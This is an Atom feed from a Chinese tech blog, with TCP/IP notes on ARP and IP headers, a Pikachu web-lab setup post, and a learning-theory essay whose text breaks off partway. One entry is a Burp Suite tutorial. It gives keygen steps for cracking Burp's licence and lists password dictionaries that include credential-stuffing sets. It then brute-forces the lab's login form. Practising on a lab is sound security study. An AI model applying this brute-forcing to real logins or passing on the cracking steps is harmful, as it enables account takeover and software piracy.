<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>VINCENT STUDIO</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://vincentstudio.info/"/>
  <updated>2020-02-27T14:27:54.501Z</updated>
  <id>https://vincentstudio.info/</id>
  
  <author>
    <name>Vincent</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>TCP/IP 学习笔记 | ARP：地址解析协议</title>
    <link href="https://vincentstudio.info/2020/02/27/047_ARP_protocal/"/>
    <id>https://vincentstudio.info/2020/02/27/047_ARP_protocal/</id>
    <published>2020-02-27T03:00:00.000Z</published>
    <updated>2020-02-27T14:27:54.501Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>切记：少就是多，慢就是快。</p></blockquote><p>当一台主机把以太网数据帧发送到位于同一局域网上的另一台主机时，是根据 48 bit 的以太网地址来确定目的接口的。设备驱动程序从不检查 <code>IP</code> 数据报中的目的 <code>IP</code> 地址。<code>ARP</code> 为 <code>IP</code> 地址到对应的硬件地址之间提供动态映射。</p><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><p>大致简化流程是这样的，网络层收到 <code>IP</code> 数据报，调用 <code>IP</code> 选路函数，判断目标主机 <code>MAC</code> 地址是否在 <code>ARP</code> 缓存中。若存在，装帧，交给以太网驱动；若不存在，广播 <code>ARP</code> 请求，大声呼喊：“谁是这个 <code>IP</code> 啊，大声告诉我你的 <code>MAC</code> 地址好吗？” 这时路人甲收到广播请求，发现是自己的 <code>IP</code>，便回应：“是我，我的 <code>MAC</code> 地址是 … ” 然后装帧，交给以太网驱动。</p><h2 id="MAC-地址"><a href="#MAC-地址" class="headerlink" title="MAC 地址"></a>MAC 地址</h2><p><code>MAC</code> 地址由 <code>IEEE</code> 定义，有三种：<code>MAC-48</code>、<code>EUI-48</code>、<code>EUI-64</code>，我们常用的是 <code>MAC-48</code>。<code>MAC-48</code>，地址空间 <code>48bit</code>，它的设计目标是一百年内够用。常以16进制数表示 <code>MAC</code> 地址，通用表示方法有三种格式：</p><ul><li><code>01-23-45-67-89-ab</code></li><li><code>01:23:45:67:89:ab</code></li><li><code>0123.4567.89ab</code></li></ul><p><code>MAC</code> 地址其前3个字节为 <a href="http://standards-oui.ieee.org/oui/oui.txt" target="_blank" rel="noopener"><code>OUI</code> (<code>Organizationally</code> <code>Unique</code> <code>Identifier</code>)</a> 组织唯一标识符，由 <code>IEEE</code> 的注册管理机构给不同厂家分配的代码，区分不同的厂家，后3字节由厂家自行分配。</p><p>例如 <code>f0:18:98:1c:8:75</code> 根据前3个字节 <code>F01898</code> 即可在 <code>OUI</code> 上查出硬件厂商为 <code>Apple Inc.</code></p><h2 id="ARP-高速缓存"><a href="#ARP-高速缓存" class="headerlink" title="ARP 高速缓存"></a>ARP 高速缓存</h2><p>当主机 A 要向本局域网上的某个主机 B 发送 <code>IP</code> 数据报时，先在其 <code>ARP</code> 高速缓存中查看是否有主机 B 的 <code>IP</code> 地址。如果有，就在 <code>ARP</code> 高速缓存中查出其对应的硬件地址，再把这个硬件地址写入 <code>MAC</code> 帧，然后通过局域网把该 <code>MAC</code> 帧发往此硬件地址。也有可能查不到主机 B 的 <code>IP</code> 地址的项目。这可能是主机 B 才入网，也可能是主机 A 刚刚加电，其高速缓存还是空的。在这种情况下，主机 A 就自动运行 <code>ARP</code>，然后按以下步骤找到主机 B 的硬件地址。</p><h3 id="查看系统-arp-缓存"><a href="#查看系统-arp-缓存" class="headerlink" title="查看系统 arp 缓存"></a>查看系统 arp 缓存</h3><pre><code>$ arp -a? (192.168.31.1) at 64:9:80:70:c6:3 on en0 ifscope [ethernet]? (192.168.31.25) at f0:18:98:1c:8:75 on en0 ifscope permanent [ethernet]? (192.168.31.163) at 24:f0:94:50:83:41 on en0 ifscope [ethernet]? (192.168.31.255) at ff:ff:ff:ff:ff:ff on en0 ifscope [ethernet]? (224.0.0.251) at 1:0:5e:0:0:fb on en0 ifscope permanent [ethernet]? (239.255.255.250) at 1:0:5e:7f:ff:fa on en0 ifscope permanent [ethernet]</code></pre><h3 id="清空-arp-缓存"><a href="#清空-arp-缓存" class="headerlink" title="清空 arp 缓存"></a>清空 arp 缓存</h3><pre><code>$ sudo arp -adPassword:192.168.31.1 (192.168.31.1) deleteddelete: cannot locate 192.168.31.25192.168.31.163 (192.168.31.163) deleted192.168.31.255 (192.168.31.255) deleted224.0.0.251 (224.0.0.251) deleted239.255.255.250 (239.255.255.250) deleted</code></pre><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>还是按照惯例，先抓个包。这里我开了一个 <code>MACOS</code> 上的一个 <code>IP</code> 扫描工具 <code>IP Scaner</code> (因为我知道它肯定会频繁使用 <code>ARP</code> 协议)，然后打开 <code>Wireshark</code> 抓包。</p><img src="/2020/02/27/047_ARP_protocal/wireshark.jpg"><p>从抓包结果不难看出，首先，这个 <code>IP</code> 扫描工具找到了路由器 <code>192.168.31.1</code> 的 <code>MAC</code> 地址，紧接着，它广播了包含局域网网段所有 <code>IP</code> <code>(192.168.31.2 - 255)</code> 的 <code>ARP</code> 请求，等待回应。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><img src="/2020/02/27/047_ARP_protocal/arp.png"><h3 id="以太网帧头"><a href="#以太网帧头" class="headerlink" title="以太网帧头"></a>以太网帧头</h3><pre><code>&#39;&#39;&#39; 下面这 14B 的数据即为以太网帧头数据-------------------------------------------------------------------------0000   ff ff ff ff ff ff f0 18 98 1c 08 75 08 06         ...........u..</code></pre><ol><li><p><code class="api-param-key">Destination</code><code class="api-param-value">6B</code><br>目的地址，抓包结果中为 <code>ff:ff:ff:ff:ff:ff</code>，即广播地址。</p></li><li><p><code class="api-param-key">Source</code><code class="api-param-value">6B</code><br>源地址，抓包结果中为 <code>f0:18:98:1c:08:75</code> 为本机 <code>MAC</code> 地址。<code>MAC</code> 地址前 3 个字节由出厂厂商默认，你可以在这个网址查找到相应结果：<a href="http://standards-oui.ieee.org/oui/oui.txt" target="_blank" rel="noopener">传送门</a></p></li><li><p><code class="api-param-key">Type</code><code class="api-param-value">2B</code><br>帧类型，表明后面的数据类型，对于 <code>ARP</code> 请求或应答来说，该字段的值为 <code>0x0806</code>。还有常用的 <code>IPv4</code> 值为 <code>0x0800</code></p></li></ol><h3 id="ARP-请求-应答"><a href="#ARP-请求-应答" class="headerlink" title="ARP 请求/应答"></a>ARP 请求/应答</h3><pre><code>&#39;&#39;&#39; 下面这 28B 的数据即为 ARP 请求数据-------------------------------------------------------------------------0000   00 01 08 00 06 04 00 01 f0 18 98 1c 08 75 c0 a8   .............u..0010   1f 19 00 00 00 00 00 00 c0 a8 1f 02               ............</code></pre><ol><li><p><code class="api-param-key">Hardware Type</code><code class="api-param-value">2B</code><br>硬件类型，表示硬件地址的类型，值为 1 表示以太网地址。</p></li><li><p><code class="api-param-key">Protocol Type</code><code class="api-param-value">2B</code><br>协议类型，表示要映射的协议地址类型。它的值为0x0800表示 <code>IPv4</code> 地址类型，它的值与包含IP数据报的以太网数据帧中的类型字段的值相同。</p></li><li><p><code class="api-param-key">Hardware Size</code><code class="api-param-value">1B</code><br>硬件地址长度，值为 6 表示 <code>MAC</code> 地址长度为 6B。</p></li><li><p><code class="api-param-key">Protocol Size</code><code class="api-param-value">1B</code><br>协议地址长度，值为 4 表示 <code>IPv4</code> 地址长度为 4B。</p></li><li><p><code class="api-param-key">Eth Source Addr</code><code class="api-param-value">6B</code><br>发送端 <code>MAC</code> 地址，抓包结果中，发送端为本机，即本机 <code>MAC</code> 为 <code>f0:18:98:1c:08:75</code>。</p></li><li><p><code class="api-param-key">Oper</code><code class="api-param-value">6B</code><br>操作类型，1 表示 <code>ARP</code> 请求，2 表示 <code>ARP</code> 应答。</p></li><li><p><code class="api-param-key">Proto Source Addr</code><code class="api-param-value">4B</code><br>发送端 <code>IP</code> 地址，本机 <code>IP</code> 为 <code>192.168.31.25</code>。</p></li><li><p><code class="api-param-key">Eth Target Addr</code><code class="api-param-value">6B</code><br>接收端端 <code>MAC</code> 地址，因为不知道，所以为 <code>00:00:00:00:00:00</code>。</p></li><li><p><code class="api-param-key">Proto Target Addr</code><code class="api-param-value">4B</code><br>接受端 <code>IP</code> 地址，希望查询 <code>MAC</code> 地址的 <code>IP</code> 为 <code>192.168.31.2</code>。</p></li></ol><p>以上数据大致意思就是，我是 <code>192.168.31.25</code>，谁的 <code>IP</code> 是 <code>192.168.31.2</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
    
    
      <category term="TCP/IP" scheme="https://vincentstudio.info/tags/TCP-IP/"/>
    
  </entry>
  
  <entry>
    <title>TCP/IP 学习笔记 | IP：网际协议</title>
    <link href="https://vincentstudio.info/2020/02/25/046_IP_protocal/"/>
    <id>https://vincentstudio.info/2020/02/25/046_IP_protocal/</id>
    <published>2020-02-25T06:00:00.000Z</published>
    <updated>2020-02-27T05:58:38.632Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>切记：少就是多，慢就是快。</p></blockquote><p><code>IP (Internet Protocol)</code> 是 <code>TCP/IP</code> 协议族中最为核心的协议。所有的 <code>TCP</code>、<code>UDP</code>、<code>ICMP</code> 及 <code>IGMP</code> 数据都以 <code>IP</code> 数据报格式传输的。</p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ol><li><p>不可靠 <code>(unreliable)</code><br><code>IP</code> 大哥牛皮哄哄地说：“我只管寄包裹，传得到传不到我不管，但是如果没传成功，我儿子 <code>ICMP</code> 会通知你。想要可靠，你还是找我另一个儿子 <code>TCP</code> 吧。”</p></li><li><p>无连接 <code>(connectionless)</code><br><code>IP</code> 大哥喝了口茶，又说：“每个包裹我都会分开来寄，你别管我每个包裹走哪条路线，我也不保证哪个包裹先送到。”</p></li></ol><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>首先，我们先抓个包看看，一个完整的数据包是怎样的：</p><img src="/2020/02/25/046_IP_protocal/wireshark_ip.jpg"><pre><code>&#39;&#39;&#39; 这 61 Bytes 的数据就是完整的数据包结构了-------------------------------------------------------------------------0000   02 00 00 00 45 00 00 39 00 00 40 00 40 06 00 00   ....E..9..@.@...0010   7f 00 00 01 7f 00 00 01 c1 69 0b b8 00 53 40 d6   .........i...S@.0020   48 1d d8 7d 80 18 18 eb fe 2d 00 00 01 01 08 0a   H..}.....-......0030   19 a1 d3 45 19 a1 d3 45 48 65 6c 6c 6f            ...E...EHello</code></pre><p>我们像剥洋葱一样，将它一层一层剥开来分析。</p><pre><code>&#39;&#39;&#39; 瞅瞅，最前面这一层 4 Bytes 的数据是 Mac 帧头，是链路层的数据结构它说明了我们数据包走的是 Loopback 网卡-------------------------------------------------------------------------0000   02 00 00 00                                       ....</code></pre><pre><code>&#39;&#39;&#39; 这一层 20 Bytes 的数据就是 IP 头，是网络层的数据结构它描述了这个包从哪来到哪去，家里有几口人，人均几亩地（咳咳）-------------------------------------------------------------------------0000   45 00 00 39 00 00 40 00 40 06 00 00 7f 00 00 01   E..9..@.@.......0010   7f 00 00 01                                       ....</code></pre><pre><code>&#39;&#39;&#39; 这一层是 TCP 头，是传输层的数据结构-------------------------------------------------------------------------0000   c1 69 0b b8 00 53 40 d6 48 1d d8 7d 80 18 18 eb   .i...S@.H..}....0010   fe 2d 00 00 01 01 08 0a 19 a1 d3 45 19 a1 d3 45   .-.........E...E</code></pre><pre><code>&#39;&#39;&#39; 最后包裹拆完就是传输的核心数据啦，下面是我们经过 utf8 编码的字符串数据 Hello-------------------------------------------------------------------------0000   48 65 6c 6c 6f                                    Hello</code></pre><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>下面有请主角 IP 协议，我们看看 IP 头的定义是怎样的：</p><img src="/2020/02/25/046_IP_protocal/ip_header.jpg"><p>从图中可以看出，IP头一般是 20 Bytes，包的总大小不超过 64 KB，下面介绍一下每部分的含义：</p><ol><li><p><code class="api-param-key">Version</code><code class="api-param-value">4bit</code><br>协议版本号，例如 IPv4 的版本号为 4</p></li><li><p><code class="api-param-key">Header Length</code><code class="api-param-value">4bit</code><br>首部长度，32bit 的数量，一般情况下值为 0101b，即 5x4=20B，最大 1111b，即 60B</p></li><li><p><code class="api-param-key">TOS | DSCP</code><code class="api-param-value">8bit</code> <code>(Type of Service)</code><br>服务类型，前 3bit 优先级字段（现已忽略），后 4bit 分别代表：最小时延、最大吞吐量、最高可靠性和最小费用，且只能置其中 1bit。如果所有 4bit 均为 0，那么就意味着是一般服务。最后 1bit 为保留字段。如下图所示：</p><img src="/2020/02/25/046_IP_protocal/tos.png"><p>后来在 <code>RFC2474</code> 中又重新对 <code>TOS</code> 进行了划分，即 Differentiated Services Field Codepoints，简称 <code>DSCP</code>。</p></li><li><p><code class="api-param-key">Total Length</code><code class="api-param-value">16bit</code><br>IP 包总长，单位 Bytes，长度 16bit，因此 IP 包的最大长度为 2^16-1 = 65535B，上面抓包的例子中 IP 包总长为 57B。</p></li><li><p><code class="api-param-key">ID</code><code class="api-param-value">16bit</code> <code>(Identification)</code><br>标识字段，相当于 <code>IP</code> 数据报的 <code>ID</code>，通常每发送一份报文它的值就会加 1。如果因为数据大于链路层 <code>MTU</code> 导致IP数据报分段 <code>(Fragment)</code> 的话，则每个分段的 <code>IP</code> 数据报的标识都是一样的。<br>从我本地抓包结果看，从本机发往外部 <code>IP</code> 的 <code>TCP</code> 包，这个字段恒为 0，有大神可以解释么？</p></li><li><p><code class="api-param-key">Flags</code><code class="api-param-value">3bit</code><br>该字段第一位不使用。第二位是 <code>DF (Don&#39;t Fragment)</code> 位，<code>DF</code> 位设为 1 时表明路由器不能对该上层数据包分段。如果一个上层数据包无法在不分段的情况下进行转发，则路由器会丢弃该上层数据包并返回一个错误信息。第三位是 <code>MF (More Fragments)</code> 位，当路由器对一个上层数据包分段，则路由器会在除了最后一个分段的IP包的包头中将 <code>MF</code> 位设为 1。</p></li><li><p><code class="api-param-key">Offsets</code><code class="api-param-value">13bit</code><br>位偏移，用于分段后标志该 <code>IP</code> 数据报相对原来数据报的偏移量。以 8 个字节为偏移单位，也就是说，每个分片的长度一定是 <code>8B (64bit)</code> 的整数倍。</p></li><li><p><code class="api-param-key">TTL</code><code class="api-param-value">8bit</code> <code>(Time to Live)</code><br>生存时间，标识了可以经过的最多路由器数，<code>TTL</code> 的初始值由源主机设置（通常为 32 或 64），一旦经过一个处理它的路由器，它的值就减去 1。当该字段的值为 0 时，数据报就被丢弃，并发送 <code>ICMP</code> 报文通知源主机。</p></li><li><p><code class="api-param-key">Protocol</code><code class="api-param-value">8bit</code><br>协议，常用的有：<code>ICMP(1)、TCP(6)、UDP(17)</code>，详细清单见 <a href="https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers" target="_blank" rel="noopener">维基百科</a></p></li><li><p><code class="api-param-key">Header Checksum</code><code class="api-param-value">8bit</code><br>首部校验，根据 <code>IP</code> 首部计算的检验和码，它不对首部后面的数据进行计算。如果校验失败则丢弃该数据报，但不会跟 <code>TTL</code> 为 0 时一样发送 <code>ICMP</code> 报文，而是交给上层协议发现数据丢失进行重传。</p></li><li><p><code class="api-param-key">Source &amp; Destination Address</code><code class="api-param-value">2 x 32bit</code><br>源地址和目标地址，例如 <code>7f 00 00 01</code> 表示 <code>127.0.0.1</code>。要注意除非使用NAT，否则整个传输的过程中，这两个地址不会改变。</p></li><li><p><code class="api-param-key">Options</code><code class="api-param-value">n x 32bit</code><br>可选项，一般为空，是数据报中的一个可变长的可选信息，主要用于测试。目前，这些任选项定义如下：<br>• 安全和处理限制（用于军事领域，详细内容参见RFC 1108[Kent 1991]）<br>• 记录路径（让每个路由器都记下它的IP地址，见7.3节）<br>• 时间戳（让每个路由器都记下它的IP地址和时间，见7.4节）<br>• 宽松的源站选路（为数据报指定一系列必须经过的IP地址，见8.5节）<br>• 严格的源站选路（与宽松的源站选路类似，但是要求只能经过指定的这些地址，不能经过其他的地址）。</p></li></ol><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><ol><li><p>电子书下载：<a href="https://github.com/zxysilent/books/blob/master/TCP-IP%E8%AF%A6%E8%A7%A3%E5%8D%B71%EF%BC%9A%E5%8D%8F%E8%AE%AE.pdf" target="_blank" rel="noopener">《TCP/IP详解 卷一：协议》</a></p></li><li><p>OSI 七层模型图解：</p></li></ol><img src="/2020/02/25/046_IP_protocal/tcpip_protocal.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincentstudio.info/categories/Tech/"/>
    
    
      <category term="TCP/IP" scheme="https://vincentstudio.info/tags/TCP-IP/"/>
    
  </entry>
  
  <entry>
    <title>Burp 表单爆破（附安装教程）</title>
    <link href="https://vincentstudio.info/2020/02/19/045_Blasting/"/>
    <id>https://vincentstudio.info/2020/02/19/045_Blasting/</id>
    <published>2020-02-19T12:00:00.000Z</published>
    <updated>2020-02-20T11:02:51.954Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文仅供学习参考，严禁用于非法用途</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="Pikachu-靶场搭建"><a href="#Pikachu-靶场搭建" class="headerlink" title="Pikachu 靶场搭建"></a>Pikachu 靶场搭建</h3><p>Pikachu 是一个用于 Web 渗透测试的靶场，具体细节及安装可以参考我上一篇博客：<a href="https://vincentstudio.info/2020/02/19/044_Pikachu_installation/">《Web 漏洞靶场 Pikachu 简介》</a></p><h3 id="Burp-安装"><a href="#Burp-安装" class="headerlink" title="Burp 安装"></a>Burp 安装</h3><p>Burp Suite 是用于攻击 web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p><ul><li><p>依赖 <a href="https://www.oracle.com/java/technologies/javase-downloads.html" target="_blank" rel="noopener">JDK 1.8</a>，高版本可能注册失败</p></li><li><p><a href="https://portswigger.net/burp/communitydownload" target="_blank" rel="noopener">官网下载最新版</a> &amp; 安装</p></li></ul><h3 id="Burp-破解"><a href="#Burp-破解" class="headerlink" title="Burp 破解"></a>Burp 破解</h3><ul><li><p><a href="https://pan.baidu.com/s/1k-TTAVe-OdOIWSMvvVdSNA" target="_blank" rel="noopener">注册机百度云下载</a> 密码:i37h</p></li><li><p>注册机下载后解压到安装目录</p></li></ul><pre><code class="lang-bash">$ pwd/Applications/Burp Suite Community Edition.app/Contents/java/app$ ls -ntotal 55424-rwxr-xr-x@ 1 501  80     65220 Feb 19 15:53 burp-loader-keygen.jardrwxr-xr-x  3 501  80        96 Feb 19 15:51 burpbrowser-rw-r--r--  1 501  80  28215285 Feb 19 15:53 burpsuite_community.jar</code></pre><ul><li>运行注册机</li></ul><pre><code class="lang-bash">$ java -jar ./burp-loader-keygen.jar</code></pre><ul><li><p>点击 <code>Run</code>，选择手动激活，拷贝请求数据到注册机，拷出算号结果，完成注册。</p></li><li><p>正常激活后每次启动都需要通过 <code>burp-loader-keygen.jar</code> 启动，可以添加一条 <code>alias</code>，简化启动</p></li></ul><pre><code class="lang-bash">DIR_BURP=&quot;/Applications/Burp\ Suite\ Community\ Edition.app/Contents/java/app&quot;alias burp=&quot;java -Xbootclasspath/p:$DIR_BURP/burp-loader-keygen.jar -jar $DIR_BURP/burpsuite_community.jar&quot;</code></pre><h3 id="爆破字典"><a href="#爆破字典" class="headerlink" title="爆破字典"></a>爆破字典</h3><pre><code class="lang-bash">$ git clone https://github.com/rootphantomer/Blasting_dictionary.git</code></pre><p>这个仓库里有一些常用字典，目录如下</p><pre><code class="lang-bash">-rwxr-xr-x   1 501  20     2344 Nov 14  2017 3389爆破字典.txt-rwxr-xr-x   1 501  20     5176 Nov 14  2017 NT密码.txt-rwxr-xr-x   1 501  20       35 Nov 14  2017 README.mddrwxr-xr-x   4 501  20      128 Nov 14  2017 a5+pudn源代码目录103W+-rwxr-xr-x   1 501  20     3637 Nov 14  2017 baopo.py-rwxr-xr-x   1 501  20       54 Nov 14  2017 big_dictionary.txt-rwxr-xr-x   1 501  20      500 Nov 14  2017 jiahouzhui.py-rwxr-xr-x   1 501  20    18284 Nov 14  2017 liunx_users_dictionaries.txt-rwxr-xr-x   1 501  20     8846 Nov 14  2017 renkoutop.txt-rwxr-xr-x   1 501  20     1015 Nov 14  2017 top100password.txt-rwxr-xr-x   1 501  20  9273839 Nov 14  2017 top10W.txt-rwxr-xr-x   1 501  20    22534 Nov 14  2017 top500姓名组合.txt-rwxr-xr-x   1 501  20      134 Nov 14  2017 weblogic默认密码列表.txt-rwxr-xr-x   1 501  20   144194 Nov 14  2017 webshellPassword.txtdrwxr-xr-x  14 501  20      448 Nov 14  2017 目录-rwxr-xr-x   1 501  20     2107 Nov 14  2017 字典.txt-rwxr-xr-x   1 501  20    40710 Nov 14  2017 后台路径.txt-rwxr-xr-x   1 501  20    62027 Nov 14  2017 常用密码.txt-rwxr-xr-x   1 501  20   174888 Nov 14  2017 渗透字典.txt-rwxr-xr-x   1 501  20    17830 Nov 14  2017 突破密码.txt-rwxr-xr-x   1 501  20     1101 Nov 14  2017 装机密码.txtdrwxr-xr-x   6 501  20      192 Nov 14  2017 美国人字典-rwxr-xr-x   1 501  20    71357 Nov 14  2017 常用用户名.txt-rwxr-xr-x   1 501  20    10197 Nov 14  2017 数据库地址.txtdrwxr-xr-x   4 501  20      128 Nov 14  2017 撞库邮箱和密码-rwxr-xr-x   1 501  20     1616 Nov 14  2017 自己收集的密码.txtdrwxr-xr-x   3 501  20       96 Nov 14  2017 各类黑客大牛后门密码drwxr-xr-x   4 501  20      128 Nov 14  2017 常用英文用户名和奇葩密码</code></pre><p>以上工具准备齐全了，就可以进入我们的正题了</p><h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p>首先在 <code>Proxy &gt; Options &gt; Proxy Listeners</code> 可以看到默认的代理设置在本地 8080 端口，因此我们需要给浏览器设置 <code>HTTP</code> 代理。</p><p>为了和我正常 <code>Chrome</code> 使用环境隔离开，我使用 <code>Firefox</code> 作为我的测试浏览器。但是 <code>Firefox</code> 默认本地流量不会走代理，所以我们还需要另外设置一下。</p><ol><li><code>Firefox</code> 打开 <code>about:config</code></li><li>搜索 <code>network.proxy.allow_hijacking_localhost</code></li><li>双击该项，将其值改为 <code>ture</code>，允许 <code>localhost</code> 劫持</li></ol><h2 id="开始爆破"><a href="#开始爆破" class="headerlink" title="开始爆破"></a>开始爆破</h2><p>输入用户名密码 <code>admin/admin</code>，然后就能抓到 <code>/bf_form.php</code> 请求了，直接右键 <code>Send to Intruter</code></p><img src="/2020/02/19/045_Blasting/burp_proxy.jpg"><p>在 <code>Intruder &gt; Position</code> 里就能看到刚才发过来的请求，我们这里使用 <code>Cluster Bomb</code> 模式，设置 <code>username</code> 和 <code>password</code> 两个变量</p><img src="/2020/02/19/045_Blasting/intruder.jpg"><p>在 <code>Interuder &gt; Payloads</code> 里配置这两个参数。<code>Payload set 1</code> 是 <code>username</code>，<code>2</code> 是 <code>password</code>，为了缩短测试时间，我们用户名只添加了 <code>admin</code> 和 <code>root</code></p><img src="/2020/02/19/045_Blasting/payloads_1.jpg"><p>密码把爆破字典里的【常用密码.txt】加载进来</p><img src="/2020/02/19/045_Blasting/payloads_2.jpg"><p>点击 <code>Start Attack</code> 开始爆破，结果按 <code>Content Length</code> 筛选一下，找到正确的账户 <code>admin/123456</code></p><img src="/2020/02/19/045_Blasting/result.jpg">]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
    
    
      <category term="Security" scheme="https://vincentstudio.info/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Web 漏洞靶场 Pikachu 简介</title>
    <link href="https://vincentstudio.info/2020/02/19/044_Pikachu_installation/"/>
    <id>https://vincentstudio.info/2020/02/19/044_Pikachu_installation/</id>
    <published>2020-02-19T05:00:00.000Z</published>
    <updated>2020-02-19T07:33:27.750Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>“如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它”。 —— Pikachu 作者 <a href="https://github.com/zhuifengshaonianhanlu" target="_blank" rel="noopener">zhuifengshaonianhanlu</a></p></blockquote><img src="/2020/02/19/044_Pikachu_installation/pikachu.jpg"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这是一个用于 Web 渗透测试的靶场，<code>php + mysql</code> 搭建。适合练手，安装简单。项目地址：<a href="https://github.com/zhuifengshaonianhanlu/pikachu" target="_blank" rel="noopener">传送门</a></p><h3 id="漏洞列表"><a href="#漏洞列表" class="headerlink" title="漏洞列表"></a>漏洞列表</h3><ul><li>Burt Force(暴力破解漏洞)</li><li>XSS(跨站脚本漏洞)</li><li>CSRF(跨站请求伪造)</li><li>SQL-Inject(SQL注入漏洞)</li><li>RCE(远程命令/代码执行)</li><li>Files Inclusion(文件包含漏洞)</li><li>Unsafe file downloads(不安全的文件下载)</li><li>Unsafe file uploads(不安全的文件上传)</li><li>Over Permisson(越权漏洞)</li><li>../../../(目录遍历)</li><li>I can see your ABC(敏感信息泄露)</li><li>PHP反序列化漏洞</li><li>XXE(XML External Entity attack)</li><li>不安全的URL重定向</li><li>SSRF(Server-Side Request Forgery)</li><li>管理工具</li><li>More…(找找看?..有彩蛋!)</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="lang-bash">docker pull area39/pikachudocker run -d -p 7001:80 area39/pikachu</code></pre><p>打开页面 127.0.0.1:7001，按照提示初始化一下即可。 Happy hacking ~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Toolkit" scheme="https://vincentstudio.info/categories/Toolkit/"/>
    
    
      <category term="Security" scheme="https://vincentstudio.info/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>学习的底层原理</title>
    <link href="https://vincentstudio.info/2020/02/17/043_Theory_of_mental_calculation/"/>
    <id>https://vincentstudio.info/2020/02/17/043_Theory_of_mental_calculation/</id>
    <published>2020-02-17T08:00:00.000Z</published>
    <updated>2020-02-25T06:18:53.700Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="什么是学习？"><a href="#什么是学习？" class="headerlink" title="什么是学习？"></a>什么是学习？</h2><blockquote><p>学习是一个系统为了适应环境而形成的一种长久的变化，通过这种长久的变化系统能够在下一次更有效的完成同类的工作。 —— 赫伯特·西蒙</p></blockquote><p>这里「系统」指心智系统，涵盖包括组织、个人、计算机等对象。</p><h2 id="心智计算理论"><a href="#心智计算理论" class="headerlink" title="心智计算理论"></a>心智计算理论</h2><p>认知心理学的终极结论是心智计算理论。程序 = 数据结构 + 算法，大脑也是如此，心智 = 心理表征 + 计算。心理表征对应一切观念、意向、感受、情绪的内在心理结构。所谓的加工和计算，就是指我们的推理联想、类比这些思维的动作。“人工智能模拟人类的行为，本质上也是模拟的这种表征转化的模式”</p><img src="/2020/02/17/043_Theory_of_mental_calculation/mind.jpg"><p>记忆分为两类， <span class="highlight">工作记忆</span> 和 <span class="highlight">长时记忆</span>。工作记忆中的统统都是心理表征，如果我们的心智是一个心灵剧场，工作记忆就是我们的舞台，中央执行系统就是舞台总监。舞台是有限大的，可以容纳几个演员，但是后台（长时记忆）是无限大的，大量的演员是距离舞台很远的，经常错过演出。</p><h3 id="什么决定了演出的水平？"><a href="#什么决定了演出的水平？" class="headerlink" title="什么决定了演出的水平？"></a>什么决定了演出的水平？</h3><ol><li>舞台调度能力（工作记忆）</li><li>演员的质量（长时记忆）</li></ol><h3 id="怎么衡量这两个指标"><a href="#怎么衡量这两个指标" class="headerlink" 